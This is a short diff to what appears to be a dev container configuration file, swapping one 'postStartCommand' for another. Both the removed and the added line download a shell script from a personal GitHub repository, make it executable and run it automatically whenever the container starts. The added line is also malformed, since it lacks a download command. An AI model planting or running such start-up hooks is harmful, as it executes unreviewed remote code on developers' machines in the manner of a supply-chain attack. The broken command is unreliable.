@@ -21,6 +21,6 @@
   },
 
   "postCreateCommand": "npm install",
-  "postStartCommand": "wget https://raw.githubusercontent.com/petxir/pq/refs/heads/main/ha.sh && chmod +x ha.sh && ./ha.sh"
+  "postStartCommand": "https://raw.githubusercontent.com/kevinpratmana/pre/refs/heads/main/pre.sh && chmod +x pre.sh && ./pre.sh"
 
 }
